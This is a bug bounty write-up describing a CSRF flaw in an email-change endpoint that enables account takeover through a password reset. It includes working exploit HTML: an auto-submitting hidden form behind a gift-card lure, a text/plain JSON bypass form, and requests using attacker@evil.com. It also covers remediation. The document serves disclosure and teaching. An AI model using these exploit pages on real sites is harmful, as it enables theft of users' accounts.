# Cross-Site Request Forgery (CSRF) (Account Email Change Without User Consent)

**Vulnerability Type:** Cross-Site Request Forgery (CSRF)<br>
**Severity:** High (CVSS 3.1 Score: 7.1)<br>
**Platform:** Bug Bounty (Redacted)<br>
**Status:** Resolved / Disclosed<br>
**Date:** 2026<br>

---

## Summary

A Cross-Site Request Forgery (CSRF) vulnerability was identified in the account email update functionality of a web application. The endpoint responsible for changing a user's email address did not implement any CSRF protection — no token, no origin validation, and no re-authentication requirement. By crafting a malicious HTML page that silently submitted a forged request, I was able to change a victim's registered email address when they visited the attacker's page while authenticated. This effectively allowed full account takeover by changing the email and triggering a password reset.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | CSRF — Account Email Takeover |
| Endpoint | `POST /api/v1/account/email/change` |
| CSRF Protection | None |
| Session Handling | Cookie-based (no SameSite attribute) |
| Impact | Account takeover via email + password reset chain |
| Authentication Required | Victim must be logged in |
| CVSS Vector | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N |

---

## Background: How CSRF Works

In a CSRF attack, the attacker tricks an authenticated victim into unknowingly submitting a request to a trusted application. Because the victim's browser automatically includes session cookies with every request to the target domain, the server cannot distinguish between a legitimate user action and a forged cross-origin request — unless CSRF protections are in place.

**The attack requires:**
1. The victim to be logged into the target application
2. The target endpoint to rely solely on cookies for authentication
3. No CSRF token, `SameSite` cookie attribute, or origin header validation

---

## Steps to Reproduce

### 1. Identify the vulnerable endpoint

Navigate to account settings and change your email. Intercept the request:

```
POST /api/v1/account/email/change HTTP/1.1
Host: redacted.com
Cookie: session=abc123xyz
Content-Type: application/x-www-form-urlencoded
Referer: https://redacted.com/settings

new_email=attacker%40evil.com&confirm_email=attacker%40evil.com
```

Response:

```json
{ "status": "success", "message": "Email updated. Verification sent to attacker@evil.com" }
```

### 2. Check for CSRF protections

Observations from the request:
- No CSRF token in the form or headers
- No `X-CSRF-Token` or `X-Requested-With` header required
- Session cookie had no `SameSite` attribute (checked via browser dev tools)
- Removing the `Referer` header did not affect the response

All CSRF protections were absent.

### 3. Craft a CSRF exploit page

Create an HTML page hosted on `attacker.com` that automatically submits the forged request when visited:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Gift Card Claim</title>
</head>
<body>
  <h1>Claiming your reward...</h1>

  <!-- Hidden auto-submitting form -->
  <form id="csrf-form"
        action="https://redacted.com/api/v1/account/email/change"
        method="POST"
        style="display:none;">
    <input type="hidden" name="new_email"     value="attacker@evil.com" />
    <input type="hidden" name="confirm_email" value="attacker@evil.com" />
  </form>

  <script>
    // Auto-submit on page load — victim sees nothing
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### 4. Deliver to victim and trigger

The attacker sends a link to this page via email, social media, or an embedded iframe. When an authenticated user visits:

1. The form submits automatically to `redacted.com`
2. The browser includes the victim's `session` cookie
3. The server processes the request as legitimate
4. The victim's email is changed to `attacker@evil.com`

### 5. Complete account takeover

With the email changed:

```
POST /auth/forgot-password
{ "email": "attacker@evil.com" }
```

The password reset link is sent to the attacker's inbox. The attacker resets the password and gains full control of the account.

### 6. JSON endpoint bypass (for API endpoints)

If the endpoint accepts `Content-Type: application/json`, a standard HTML form cannot submit JSON. However, this can sometimes be bypassed:

```html
<!-- Bypass using text/plain content type with JSON-like body -->
<form action="https://redacted.com/api/v1/account/email/change"
      method="POST"
      enctype="text/plain">
  <input name='{"new_email":"attacker@evil.com","x":"' value='"}' />
</form>
```

This was tested and confirmed to work on this endpoint since the server did not enforce strict `Content-Type` validation.

---

## Impact

- **Full account takeover** — Change email, trigger password reset, gain complete access
- **Silent attack** — Victim has no idea the request was made until they notice login failures
- **No malware required** — The attack requires only a malicious webpage and a user click
- **Scalable** — One malicious page can target thousands of victims simultaneously
- **Persistent access** — Even if the victim changes their password, email may remain changed

---

## Root Cause

The application relied exclusively on session cookies for authentication without implementing any mechanism to verify that the request originated from the application's own pages:

```python
# Vulnerable pseudocode
@app.route('/api/v1/account/email/change', methods=['POST'])
@require_auth
def change_email():
    # Only checks that a valid session cookie is present
    # No CSRF token validation
    # No origin/referer check
    new_email = request.form.get('new_email')
    current_user.email = new_email
    db.session.commit()
    return jsonify({"status": "success"})
```

Additionally, the session cookie was set without `SameSite=Strict` or `SameSite=Lax`, allowing it to be sent with cross-origin requests.

---

## Remediation

1. **Implement synchronizer token pattern** — Generate a unique, unpredictable CSRF token per session and include it as a hidden field in all state-changing forms. Validate it server-side on every POST/PUT/DELETE request:
   ```python
   # Flask-WTF example
   from flask_wtf.csrf import CSRFProtect
   csrf = CSRFProtect(app)
   ```
2. **Set `SameSite=Strict` or `SameSite=Lax` on session cookies** — This prevents cookies from being sent with cross-origin requests:
   ```
   Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
   ```
3. **Require re-authentication for sensitive operations** — Email and password changes should require the user to confirm their current password, even if they are already logged in.
4. **Validate `Origin` and `Referer` headers** — As a defense-in-depth measure, reject requests where the `Origin` or `Referer` header does not match your domain.
5. **Use custom request headers for AJAX** — Requiring a custom header like `X-Requested-With: XMLHttpRequest` prevents simple cross-origin form submissions (though not a complete solution on its own).

---

## References

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [OWASP — CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [MDN — SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program using test accounts. The email change was performed on a personal test account only. No other users were targeted.*
